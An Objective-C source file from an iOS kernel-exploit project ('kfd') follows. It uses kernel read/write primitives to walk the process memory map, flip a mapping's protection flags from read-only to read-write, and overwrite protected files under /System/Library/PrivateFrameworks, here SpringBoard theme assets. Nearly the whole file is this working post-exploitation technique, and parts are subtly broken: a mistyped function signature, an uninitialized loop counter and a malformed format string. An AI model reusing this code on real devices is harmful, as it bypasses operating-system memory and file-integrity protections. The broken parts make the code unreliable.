//
//  thanks_opa334dev_htrowii.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/30.
//

#import <Foundation/Foundation.h>
#import <sys/mman.h>
#import <UIKit/UIKit.h>
#import "krw.h"
#import "proc.h"
#import "common.h"

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
//#define FLAGS_PROT_MASK     0xF << FLAGS_PROT_SHIFT
//#define FLAGS_MAXPROT_MASK  0xF << FLAGS_MAXPROT_SHIFT
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800

// https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.41.9/bsd/sys/mman.h#L143 from wh1te4ever/xsf1re
#define MS_INVALIDATE   0x0002  /* [MF|SIO] invalidate all cached data https://openradar.appspot.com/FB8914231 My favorite: you can call msync(…, MS_INVALIDATE) on the mmaped region, asking xnu to throw away what it knows about the vnode. If you compile mmap_copy.cc with MMAP_COPY_MSYNC_INVALIDATE defined, it will do this. You can even use this technique to “save” a broken vnode from an entirely different process by opening the file,mmaping it, and then calling msync. */


u64 getTask(void) {
    u64 proc = getProc(getpid());
    u64 proc_ro = kread64(proc + 0x18);
    u64 pr_task = kread64(proc_ro + 0x8);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    return pr_task;
}

u64 kread_ptr(u64 kaddr) {
    u64 ptr = kread64(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }

    return ptr;
}

void kreadbuf(u64 kaddr, void* output, size_t size)
{
    u64 endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(u64 curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

u64 vm_map_get_header(u64 vm_map_ptr)
{
    return vm_map_ptr + 0x10;
}

u64 vm_map_header_get_first_entry(u64 vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + 0x8);
}

u64 vm_map_entry_get_next_entry(u64 vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + 0x8);
}


uint32_t vm_header_get_nentries(u64 vm_header_ptr)
{
    return kread32(vm_header_ptr + 0x20);
}

void vm_entry_get_range(u64 vm_entry_ptr, u64 *start_address_out, u64 *end_address_out)
{
    u64 range[2];
    usleep(350);
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}


//void vm_map_iterate_entries(u64 vm_map_ptr, void (^itBlock)(u64 start, u64 end, u64 entry, BOOL *stop))
void vm_map_iterate_entries(u64 vm_map_ptr, void (^itBlock)(u64 start, u64 end, u64 entry, BOOL *stop))
{
    u64 header = vm_map_get_header(vm_map_ptr);
    u64 entry = vm_map_header_get_first_entry(header);
    u64 numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        u64 start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

u64 vm_map_find_entry(u64 vm_map_ptr, u64 address)
{
    __block u64 found_entry = 0;
    usleep(350);
        vm_map_iterate_entries(vm_map_ptr, ^(u64 start, u64 end, u64 entry, BOOL *stop) {
            if (address >= start && address < end) {
                found_entry = entry;
                *stop = YES;
            }
        });
        return found_entry;
}

void vm_map_entry_set_prot(u64 entry_ptr, vm_prot_t prot, vm_prot_t max_prot)
{
    u64 flags = kread64(entry_ptr + 0x48);
    u64 new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((u64)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((u64)max_prot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        kwrite64(entry_ptr + 0x48, new_flags);
    }
}

u64 start = 0, end = 0;

u64 task_get_vm_map(u64 task_ptr)
{
    return kread_ptr(task_ptr + 0x28);
}

char* funVnodeRead(*file) {
    printf("attempting opa's method\n");
    printf("reading %s", file);
    int file_index = open(file, O_RDONLY);
    if (file_index == -1)  {
        printf("to file nonexistent\n");
        return -1;
    }
    off_t file_size = lseek(file_index, 0, SEEK_END);
    printf("mmap as readonly\n");
    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED | MAP_RESILIENT_CODESIGN, file_index, 0);
    if (file_data == MAP_FAILED) {
        printf("Map failed\n");
        close(file_index);
        return 0;
    }
    munmap(file_data, file_size);
    close(file_index);
    return file_data;
}

void funVnodeSave(char* file) {
    int file_index = open(file, O_RDONLY);
    if (file_index == -1)  {
        printf("to file nonexistent\n)");
        return;
    }
    off_t file_size = lseek(file_index, 0, SEEK_END);
    printf("mmap as readonly\n");
    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED, file_index, 0);
    if (file_data == MAP_FAILED) {
        close(file_index);
        return;
    }
    
    for (int i; i<10; i++) {
        // msync with invalidate to
        printf("msyncing\n");
        if (msync(file_data, file_size, MS_INVALIDATE) == -1) {
            perror("[-] Failed to msync\n");
        }
    }
}

#pragma mark overwrite2
u64 funVnodeOverwrite2(char* to, char* from) {
    printf("writing to %s", to);
    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1)  {
        printf("\nto file nonexistent\n");
        return -1;
    }
    
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    
    
    printf(" from %s\n", from);
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1)  {
        printf("\nfrom file nonexistent\n");
        return -1;
    }
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    if(to_file_size < from_file_size) {
        close(from_file_index);
        close(to_file_index);
        printf("[-] File is too big to overwrite!\n");
        return -1;
    }
    usleep(450);
    //mmap as read only
    printf("mmap as readonly\n");
    char* to_file_data = mmap(NULL, to_file_size, PROT_READ, MAP_SHARED, to_file_index, 0);
    if (to_file_data == MAP_FAILED) {
        close(to_file_index);
        // Handle error mapping source file
        return 0;
    }
    
    // set prot to rw-
    printf("task_get_vm_map -> vm ptr\n");
    u64 vm_ptr = task_get_vm_map(getTask());
    u64 entry_ptr = vm_map_find_entry(vm_ptr, (u64)to_file_data);
    printf("set prot to rw-\n");
    vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
    
    char* from_file_data = mmap(NULL, from_file_size, PROT_READ, MAP_SHARED, from_file_index, 0);
    if (from_file_data == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    printf("it is writable!\n");
    memcpy(to_file_data, from_file_data, from_file_size);
    printf("[i] msync ret: %dn", msync(to_file_data, to_file_size, MS_SYNC));
//    funVnodeSave(to);
    
    // Cleanup
    munmap(from_file_data, from_file_size);
    munmap(to_file_data, to_file_size);
    
    close(from_file_index);
    close(to_file_index);
    printf("done\n");
    // Return success or error code
    return 0;
}

u64 funVnodeOverwriteWithBytes(const char* filename, off_t file_offset, const void* overwrite_data, size_t overwrite_length, bool unmapAtEnd) {
    printf("attempting opa's method\n");
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    off_t file_size = lseek(file_index, 0, SEEK_END);
    
    if (file_size < file_offset + overwrite_length) {
        close(file_index);
        printf("[-] Offset + length is beyond the file size!\n");
        return -1;
    }
    
//     mmap as read-write
    printf("mmap as read only\n");
    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, file_index, 0);
    if (file_data == MAP_FAILED) {
        printf("failed mmap...\n try again");
        close(file_index);
        // Handle error mapping the file
        return -1;
    }
    
    printf("task_get_vm_map -> vm ptr\n");
    u64 task_ptr = getTask();
    u64 vm_ptr = task_get_vm_map(task_ptr);
    printf("entry_ptr\n");
    u64 entry_ptr = vm_map_find_entry(vm_ptr, (u64)file_data);
    printf("set prot to rw-\n");
    vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
    
    printf("Writing data at offset %lld\n", file_offset);
    memcpy(file_data + file_offset, overwrite_data, overwrite_length);
    
//    if (unmapAtEnd) {
        munmap(file_data, file_size);
        close(file_index);
//    }

    return 1;
}

void overwriteWithFileImpl(NSURL *replacementURL, const char *pathToTargetFile) {
    NSString *tempURLString = [replacementURL absoluteString];
    const char *cTempURL = [tempURLString UTF8String];
    const char *shortenedURL = cTempURL + 7;  // Make sure that cTempURL is null-terminated
    
    // Print the shortenedURL to verify if it's correct
    printf("Shortened URL: %s\n", shortenedURL);
    
    funVnodeOverwrite2(pathToTargetFile, shortenedURL);
}

void TempOverwriteFile(int type) {
    if (type == 0) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/folderDark.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/folderLight.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 1) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/podBackgroundViewDark.visualstyleset", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/podBackgroundViewLight.visualstyleset", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 2) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 3) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/folderExpandedBackgroundHome.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/homeScreenOverlay.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoardHome.framework/homeScreenOverlay-iPad.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 4) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/SpringBoard.framework/homeScreenBackdrop-application.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 5) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/plattersDark.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/platters.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 6) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/PlatterKit.framework/platterVibrantShadowDark.visualstyleset", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/PlatterKit.framework/platterVibrantShadowLight.visualstyleset", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 7) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/modules.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    } else if (type == 8) {
        funVnodeOverwrite2("/System/Library/PrivateFrameworks/CoreMaterial.framework/modulesBackground.materialrecipe", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/TempOverwriteFile"].UTF8String);
    }
}
